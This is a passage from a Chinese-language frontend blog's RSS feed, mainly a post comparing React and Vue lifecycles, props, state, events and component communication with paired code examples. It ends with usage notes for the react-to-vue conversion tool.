    <span>const</span> <span>{</span> type<span>,</span> disabled <span>}</span> <span>=</span> <span>toRefs</span><span>(</span>props<span>)</span><span>;</span>
    <span>const</span> <span>{</span> <span>value</span><span>:</span> $type <span>}</span> <span>=</span> type<span>;</span>
    <span>const</span> <span>{</span> <span>value</span><span>:</span> $disabled <span>}</span> <span>=</span> disabled<span>;</span>

    <span>// 我们使用 JSX 语法去写我们的组件</span>
    <span>return</span> <span>(</span><span>)</span> <span>=></span> <span>(</span>
      <span>&lt;</span>button <span>class</span><span>=</span><span>{</span><span>b</span><span>(</span><span>[</span>$type<span>]</span><span>)</span><span>}</span> disabled<span>=</span><span>{</span>$disabled<span>}</span><span>></span>
        <span>{</span>slots<span>.</span><span>default</span><span>(</span><span>)</span> <span>?</span> <span>&lt;</span>span<span>></span> <span>{</span>slots<span>.</span><span>default</span><span>(</span><span>)</span><span>}</span> <span>&lt;</span><span>/</span>span<span>></span> <span>:</span> <span>null</span><span>}</span><span>{</span><span>" "</span><span>}</span>
      <span>&lt;</span><span>/</span>button<span>></span>
    <span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> button<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/learning-vue3-1.gif" type="image/gif"/>
    </item>
    <item>
      <title>从 React 到 Vue</title>
      <link>https://vxhly.github.io/views/vuejs/react-to-vue.html</link>
      <guid>https://vxhly.github.io/views/vuejs/react-to-vue.html</guid>
      <source url="https://vxhly.github.io/rss.xml">从 React 到 Vue</source>
      <description>前言
本篇文章将记录 React 语法与 Vue 语法互相转换的要点.

</description>
      <category>vuejs</category>
      <pubDate>Tue, 13 Jul 2021 14:23:02 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇文章将记录 React 语法与 Vue 语法互相转换的要点.</p>
</div>

<h2 id="生命周期" tabindex="-1"> 生命周期</h2>
<p>Vue 中的组件也有与 React 组件类似的生命周期方法。例如, 当组件状态就绪, 而组件还没有挂载到页面之前, 将触发 created 这个 hook。</p>
<p>这里两者的一大区别是：React 中的 shouldComponentUpdate 在 Vue 里没有等效存在。由于 Vue 是有反应系统的, 所以这里不需要它。</p>
<p>React 的生命周期与 vue 的生命周期有着很大的不同, 下面列出的是 React 和 Vue 的生命周期对比</p>
<h3 id="react-生命周期" tabindex="-1"> React 生命周期</h3>
<p><img src="/assets/react-life-cycle-old.png" alt="React 生命周期"></p>
<h4 id="挂载期-mounting" tabindex="-1"> 挂载期（Mounting）</h4>
<p>constructor() =&gt; componentWillMount() =&gt; render() =&gt; componentDidMount()</p>
<h4 id="存在更新期-updating" tabindex="-1"> 存在更新期（Updating）</h4>
<p>当更新执行直接执行以下：</p>
<p>componentWillReceiveProps(nextProps) =&gt; shouldComponentUpdate(nextProps,nextState) =&gt; componentWillUpdate (nextProps,nextState) =&gt; render() =&gt; componentDidUpdate(prevProps,prevState)</p>
<h4 id="销毁时-unmounting" tabindex="-1"> 销毁时（Unmounting）</h4>
<p>关闭页面组件最终都会销毁： componentWillUnmount()</p>
<p>强调几点：</p>
<ol>
<li>
<p>constructor() 中完成了 React 数据的初始化, 它接受两个参数：props 和 context, 当想在函数内部使用这两个参数时, 需使用 super()传入这两个参数。注：只要使用了 constructor()就必须写 super(),否则会导致 this 指向错误。</p>
</li>
<li>
<p>render()中会插入 jsx 生成的 dom 结构, react 会生成一份虚拟 dom 树, 在每一次组件更新时, 在此 react 会通过其 diff 算法比较更新前后的新旧 DOM 树, 比较以后, 找到最小的有差异的 DOM 节点, 并重新渲染。</p>
</li>
</ol>
<h3 id="vue-生命周期" tabindex="-1"> Vue 生命周期</h3>
<p><img src="/assets/vue-life-cycle-old.png" alt="Vue 生命周期"></p>
<h4 id="vue-生命周期在项目中的执行顺序" tabindex="-1"> vue 生命周期在项目中的执行顺序</h4>
<p>beforeCeate() =&gt; data() =&gt; created() =&gt; beforeMount() =&gt; mounted()</p>
<p>当更新会再 created 之后插入： beforeUpdate =&gt; updated</p>
<p>关闭页面组件最终都会销毁： beforeDestroy() =&gt; destroyed()</p>
<p>强调几点：</p>
<ol>
<li>beforeCeate 在事件和生命周期钩子初始化前调用</li>
<li>data 的初始化是在 created 前完成数据观测(data observer)</li>
</ol>
<h4 id="vue-中内置方法属性的运行顺序" tabindex="-1"> vue 中内置方法属性的运行顺序</h4>
<p>props =&gt; methods =&gt; data =&gt; computed =&gt; watch</p>
<h2 id="react-与-vue-语法差异对比" tabindex="-1"> React 与 Vue 语法差异对比</h2>
<p>以下内容参考来源 <a href="https://segmentfault.com/a/1190000017872474" target="_blank" rel="noopener noreferrer">从 react 转职到 vue 开发的项目准备</a></p>
<h3 id="props-对比" tabindex="-1"> props 对比</h3>
<ol>
<li>Vue 的 prop 必须在 props 字段里声明。React 的 prop 不强制声明, 声明时也可以使用 prop-types 对其声明约束。</li>
<li>Vue 的 prop 声明过后挂在在组件的 this 下, 需要的时候在 this 中获取。React 的 prop 存在组件的 props 字段中, 使用的时候直接在 this.props 中获取。</li>
</ol>
<h3 id="组件状态对比" tabindex="-1"> 组件状态对比</h3>
<ol>
<li>Vue 的状态 data 需要在组件的 data 字段中以函数的方式声明并返回一个对象。React 的状态 state 可以直接挂载在组件的 state 字段下, 在使用之前初始化即可。</li>
<li>Vue 的状态 data 声明后挂在在 this 下面, 需要的是时候在 this 中获取。React 的状态 state 存在组件的 state 字段中, 使用的时候直接在 this.state 中获取。</li>
<li>Vue 的状态更新可以直接对其进行赋值, 视图可以直接得到同步。React 的状态更新必须使用 setState, 否则视图不会更新。</li>
</ol>
<h3 id="组件方法对比" tabindex="-1"> 组件方法对比</h3>
<ol>
<li>Vue 的方法需要在 methods 字段下声明。React 的方法用方法的方式声明在组件下即可。</li>
<li>Vue 与 React 使用方法的方式相同, 因为都是挂载在组件中, 直接在 this 中获取即可。</li>
</ol>
<h3 id="计算属性对比" tabindex="-1"> 计算属性对比</h3>
<ol>
<li>Vue 有计算属性在 computed 字段中声明。React 中无计算属性特性, 需要其他库如 mobx 辅助完成。</li>
<li>Vue 的计算属性声明后挂载在 this 下, 需要的时候在 this 中获取。</li>
</ol>
<h3 id="监听数据对比" tabindex="-1"> 监听数据对比</h3>
<ol>
<li>Vue 中可以在 watch 字段中对 prop、data、computed 进行对比, 然后做相应的操作。在 React 所有变化需要在声明周期 componentWillReveiveProps 中手动将 state 和 prop 进行对比。</li>
</ol>
<h2 id="jsx-语法改造成-vue-语法的注意事项" tabindex="-1"> JSX 语法改造成 Vue 语法的注意事项</h2>
<ol>
<li>注释可以进行忽略, jsx 注释一般为</li>
</ol>
<div><pre><code><span>{</span>
  <span>/* ....... */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><ol start="2">
<li>React 和 Vue 中的 props 有着大部分的相同, 但是也需要进行转化</li>
</ol>
<table>
<thead>
<tr>
<th><strong>框架</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>React</td>
<td>通过 propTypes 来定义属性名和属性类型,defaultProps 用来设置默认值</td>
</tr>
<tr>
<td>Vue</td>
<td>通过添加 props 属性</td>
</tr>
</tbody>
</table>
<ol start="3">
<li>组件的自有状态</li>
</ol>
<table>
<thead>
<tr>
<th><strong>框架</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>React</td>
<td>在初始化的时候, 通过 this.state = {xxx}来设置</td>
</tr>
<tr>
<td>Vue</td>
<td>通过 data 返回函数来设置值, 不同于 react 的 state, vue 是响应式</td>
</tr>
</tbody>
</table>
<ol start="3">
<li>处理事件</li>
</ol>
<table>
<thead>
<tr>
<th><strong>框架</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>React</td>
<td>相应的事件都加到了组件的实例方法上</td>
</tr>
<tr>
<td>Vue</td>
<td>设计上比较好, 处理事件都加在一个 methods 对象下面, 方便查找,更直观</td>
</tr>
</tbody>
</table>
<div><pre><code><span>// react</span>
<span>class</span> <span>FrontendMagazine</span> <span>{</span>
  <span>clickme</span><span>(</span><span>)</span> <span>{</span>
    <span>// xxxx</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// vue</span>
<span>{</span>
    <span>name</span><span>:</span> <span>'frontend-magazine'</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
        <span>clickme</span> <span>(</span><span>)</span> <span>{</span>
            <span>// xxx</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ol start="4">
<li>组件的错误捕获</li>
</ol>
<table>
<thead>
<tr>
<th><strong>框架</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>React</td>
<td>componentDidCatch</td>
</tr>
<tr>
<td>Vue</td>
<td>errorCaptured</td>
</tr>
</tbody>
</table>
<ol start="5">
<li>在标签上写的 onxxx, 一般对应的 vue 改造为</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp</span> <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>}</span></span><span>></span></span><span><span><span>&lt;/</span>comp</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>com</span> <span>@click</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>com</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="6">
<li>组件绑定的参数, 需要在 vue 中转成 v-bind</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp</span> <span>style</span><span><span>=</span><span>{</span><span>{</span> <span>xxx</span><span>:</span> xxxx <span>}</span><span>}</span></span><span>></span></span><span><span><span>&lt;/</span>comp</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp</span> <span>:style</span><span><span>=</span><span>"</span>{ xxx: xxx }<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>comp</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="7">
<li>组件上的属性名 className 直接替换成 class</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp</span> <span>className</span><span><span>=</span><span>"</span>xxxx<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>comp</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp</span> <span>class</span><span><span>=</span><span>"</span>xxxx<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>comp</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="8">
<li>在较高版本的 React 里有 flagments 的支持, 允许根节点返回多个节点, 目前没有看到 vue 支持的, 在 vue 中我们直接使用一个块级元素包裹</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span>{</span><span>/* 第一种写法 */</span><span>}</span>
＜flagment＞
  <span><span><span>&lt;</span>comp1</span><span>></span></span><span><span><span>&lt;/</span>comp1</span><span>></span></span>
  <span><span><span>&lt;</span>comp2</span><span>></span></span><span><span><span>&lt;/</span>comp2</span><span>></span></span>
＜<span>/</span>flagment＞

<span>{</span><span>/* 第二种写法 */</span><span>}</span>
<span>const</span> <span>App</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>(</span>
  <span><span><span>&lt;</span></span><span>></span></span><span>
    </span><span><span><span>&lt;</span>span</span><span>></span></span><span>I'm</span><span><span><span>&lt;/</span>span</span><span>></span></span><span>
    </span><span><span><span>&lt;</span>span</span><span>></span></span><span>Fragment</span><span><span><span>&lt;/</span>span</span><span>></span></span><span>
  </span><span><span><span>&lt;/</span></span><span>></span></span>
<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span>&lt;!--第一种写法--></span>
<span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>xxxx<span>"</span></span><span>></span></span>
   <span><span><span>&lt;</span>comp1</span><span>></span></span><span><span><span>&lt;/</span>comp1</span><span>></span></span>
  <span><span><span>&lt;</span>comp2</span><span>></span></span><span><span><span>&lt;/</span>comp2</span><span>></span></span> 
<span><span><span>&lt;/</span>div</span><span>></span></span>

<span>&lt;!--第二种写法--></span>
<span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>xxxx<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>span</span><span>></span></span>I'm<span><span><span>&lt;/</span>span</span><span>></span></span>
   <span><span><span>&lt;</span>span</span><span>></span></span>Fragment<span><span><span>&lt;/</span>span</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ol start="9">
<li>JSX 渲染页面或者组件都是通过 render 方法进行渲染的, 在 vue 中 既可以保留 render 方法, 也可以将其 render 方法进行改造成 template</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>"react"</span><span>;</span>
<span>export</span> <span>default</span> <span>class</span> <span>ApplyOrSave</span> <span>extends</span> <span>React<span>.</span>Component</span> <span>{</span>
  <span>render</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>xxxx<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>comp1</span><span>></span></span><span><span><span>&lt;/</span>comp1</span><span>></span></span>
  <span><span><span>&lt;</span>comp2</span><span>></span></span><span><span><span>&lt;/</span>comp2</span><span>></span></span> 
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><ol start="10">
<li>组件替换, 在 React 语法中, 组件在模板中的写法基本是 xxx.xxx, 在 vue 中识别不到, 需要我们转成中横线的写法</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span><span>Comp.Panel</span></span><span>></span></span><span><span><span>&lt;/</span><span>Comp.Panel</span></span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>comp-panel</span><span>></span></span><span><span><span>&lt;/</span>comp-panel</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="11">
<li>JSX 语法中允许使用   styled-components 生成一个组件（该工具即在 js 中写 css,css in js）, 在 vue 中也同样支持, 但是需要将该依赖替换成 vue-styled-components</li>
</ol>
<ul>
<li>JSX 写法</li>
</ul>
<div><pre><code><span>import</span> styled <span>from</span> <span>"styled-components"</span><span>;</span>

<span>const</span> AppSetupContainer <span>=</span> styled<span>.</span>div<span><span>`</span><span>
  display: flex;
  flex-direction: column;
  width: 100%;
  justify-content: center;
  align-items: center;
</span><span>`</span></span><span>;</span>
<span>function</span> <span>AppSetup</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>AppSetupContext.Provider</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span><span>AppSetupContainer</span></span><span>></span></span><span><span><span>&lt;/</span><span>AppSetupContainer</span></span><span>></span></span><span>
    </span><span><span><span>&lt;/</span><span>AppSetupContext.Provider</span></span><span>></span></span>
  <span>)</span><span>;</span>
<span>}</span>

<span>export</span> <span>default</span> AppSetup<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code>import styled from 'vue-styled-components' const AppSetupContainer = styled.div`
display: flex; flex-direction: column; width:100%; justify-content:center;
align-items: center; ` export default { render() { return
<span><span><span>&lt;</span>AppSetupContainer</span><span>></span></span><span><span><span>&lt;/</span>AppSetupContainer</span><span>></span></span>
} }
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="react-中组件通信写法对应的-vue-中组件通信写法" tabindex="-1"> React 中组件通信写法对应的 Vue 中组件通信写法</h2>
<h3 id="数据传递-provide-inject" tabindex="-1"> 数据传递（Provide / Inject）</h3>
<ul>
<li>React 写法</li>
</ul>
<div><pre><code><span>// 父组件</span>
<span>import</span> React <span>from</span> <span>'react'</span>
<span>const</span> AppSetupContext <span>=</span> React<span>.</span><span>createContext</span><span>(</span><span>)</span>

<span>function</span> <span>AppSetup</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> state <span>=</span> <span>{</span>
    <span>hello</span><span>:</span> <span>'hello'</span>
  <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>AppSetupContext.Provider</span></span> <span>value</span><span><span>=</span><span>{</span><span>{</span>  state <span>}</span><span>}</span></span><span>></span></span><span>
    </span><span><span><span>&lt;/</span><span>AppSetupContext.Provider</span></span><span>></span></span>
  <span>)</span>
<span>}</span>
<span>export</span> <span>default</span> AppSetup

<span>export</span> <span>{</span>
  AppSetupContext
<span>}</span>

<span>// 子组件</span>
<span>import</span> <span>{</span> AppSetupContext <span>}</span> <span>from</span> <span>'./app_setup.js'</span>
<span>import</span> React<span>,</span> <span>{</span> useContext <span>}</span> <span>from</span> <span>'react'</span>

<span>function</span> <span>child</span> <span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> state <span>}</span> <span>=</span>  <span>useContext</span><span>(</span>AppSetupContext<span>)</span>
<span>}</span>
<span>export</span> <span>default</span>  child
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span>&lt;!--父组件--></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>provide</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>state</span><span>:</span> <span>{</span>
        <span>hello</span><span>:</span> <span>"hello"</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>

<span>&lt;!--子组件--></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>inject</span><span>:</span> <span>[</span><span>"state"</span><span>]</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="数据传递-props-父组件向子组件传递消息" tabindex="-1"> 数据传递（props）- 父组件向子组件传递消息</h3>
<ul>
<li>React 写法</li>
</ul>
<div><pre><code><span>import</span> PropTypes <span>from</span> <span>"prop-types"</span><span>;</span>
<span>class</span> <span>Welcome</span> <span>extends</span> <span>React<span>.</span>Component</span> <span>{</span>
  <span>render</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span><span><span>&lt;</span>h1</span><span>></span></span><span>Hello, </span><span>{</span><span>this</span><span>.</span>props<span>.</span>name<span>}</span><span><span><span>&lt;/</span>h1</span><span>></span></span><span>;</span>
  <span>}</span>
<span>}</span>
Welcome<span>.</span>propTypes <span>=</span> <span>{</span>
  <span>name</span><span>:</span> PropTypes<span>.</span>string<span>,</span> <span>// 这个是类型定义</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>Vue 写法</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>name</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> String<span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="数据传递-props-子组件向父组件传递消息" tabindex="-1"> 数据传递（props）- 子组件向父组件传递消息</h3>
<ul>
<li>React 写法</li>
</ul>
<div><pre><code><span>// 子组件</span>
<span>import</span> React<span>,</span> <span>{</span> Component <span>}</span> <span>from</span> <span>'react'</span><span>;</span>
<span>import</span> PropTypes <span>from</span> <span>'prop-types'</span><span>;</span>
<span>class</span> <span>List3</span> <span>extends</span> <span>Component</span> <span>{</span>
  <span>static</span> propTypes <span>=</span> <span>{</span>
    <span>hideConponent</span><span>:</span> PropTypes<span>.</span>func<span>.</span>isRequired<span>,</span>
  <span>}</span>
  <span>render</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>(</span>
      <span><span><span>&lt;</span>div</span><span>></span></span><span>
        哈哈,我是List3
        </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>this</span><span>.</span>props<span>.</span>hideConponent<span>}</span></span><span>></span></span><span>隐藏List3组件</span><span><span><span>&lt;/</span>button</span><span>></span></span><span>
      </span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>export</span> <span>default</span> List3<span>;</span>

<span>// 父组件</span>
<span>import</span> React<span>,</span> <span>{</span> Component <span>}</span> <span>from</span> <span>'react'</span><span>;</span>
<span>import</span> List3 <span>from</span> <span>'./components/List3'</span><span>;</span>
<span>export</span> <span>default</span> <span>class</span> <span>App</span> <span>extends</span> <span>Component</span> <span>{</span>
  <span>constructor</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span><span>...</span>args<span>)</span><span>;</span>
    <span>this</span><span>.</span>state <span>=</span> <span>{</span>
      <span>isShowList3</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span>
  <span>showConponent</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span>
      <span>isShowList3</span><span>:</span> <span>true</span><span>,</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span>

  <span>hideConponent</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span>
        <span>isShowList3</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span>

  <span>render</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>(</span>
        <span><span><span>&lt;</span>div</span><span>></span></span><span>
          </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>this</span><span>.</span>showConponent<span>}</span></span><span>></span></span><span>显示Lists组件</span><span><span><span>&lt;/</span>button</span><span>></span></span><span>
          </span><span>{</span>
              <span>this</span><span>.</span>state<span>.</span>isShowList3 <span>?</span><span><span><span>&lt;</span><span>List3</span></span> <span>hideConponent</span><span><span>=</span><span>{</span><span>this</span><span>.</span>hideConponent<span>}</span></span> <span>/></span></span><span>:</span><span>null</span>
          <span>}</span><span>
        </span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>Vue 写法</p>
<div><pre><code><span>&lt;!-- 子组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    哈哈,我是List3
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>hideConponent<span>"</span></span><span>></span></span>隐藏List3组件<span><span><span>&lt;/</span>button</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>hideConponent</span><span>:</span> any<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>showConponent<span>"</span></span><span>></span></span>显示Lists组件<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;</span>List3</span> <span>:hideConponent</span><span><span>=</span><span>"</span>hideConponent<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>state</span><span>:</span> <span>{</span>
        <span>isShowList3</span><span>:</span> fasle<span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>showConponent</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>state<span>.</span>isShowList3 <span>=</span> <span>true</span><span>;</span>
    <span>}</span><span>,</span>
    <span>hideConponent</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>state<span>.</span>isShowList3 <span>=</span> <span>false</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="使用工具转换" tabindex="-1"> 使用工具转换</h2>
<p>为了减轻工作量, 社区提供了个转换工具, 该工具虽不能做到 100% 转换, 但是也能达到 90% 以上的支持, 转换出来的 vue 支持的语法还是可能有包含 React 语法或者 React 专用的依赖, 这时候需要手动进行清理和替换</p>
<p>如果项目中使用了大量的 React 编写的组件, 还需要将其转成 vue 的组件</p>
<p>该工具只作为辅助工具使用</p>
<h3 id="安装转换工具" tabindex="-1"> 安装转换工具</h3>
<p>工具　 GitHub 　地址：<a href="https://github.com/vicwang163/react-to-vue/" target="_blank" rel="noopener noreferrer">react-to-vue</a></p>
<div><pre><code><span>npm</span> <span>install</span> react-to-vue -g
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="工具使用" tabindex="-1"> 工具使用</h3>
<div><pre><code>Usage: rtv [options] file(react component)


Options:

  -V, --version         output the version number
  -o --output [string]  the output file name
  -t --ts               it is a typescript component
  -h, --help            output usage information

 # demo

 rtv demo.js
 rtv demo.js -o demo-vue.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="工具转换原理" tabindex="-1"> 工具转换原理</h3>
<ol>
<li>对于输入的文件首先使用 babylon 来解析, 生成 ast</li>
<li>如果文件是 typescript, 会去掉相应的 ts 描述</li>
<li>对 ast 进行遍历, 首先提取 propTypes 和 defaultProps</li>
<li>根据组件类型, 处理函数组件和类组件</li>
<li>在类组件里面, 需要转换生命周期, state 等信息</li>
<li>最后根据提取到的信息拼接成 vue 组件, 通过 prettier-eslint 来美化</li>
</ol>
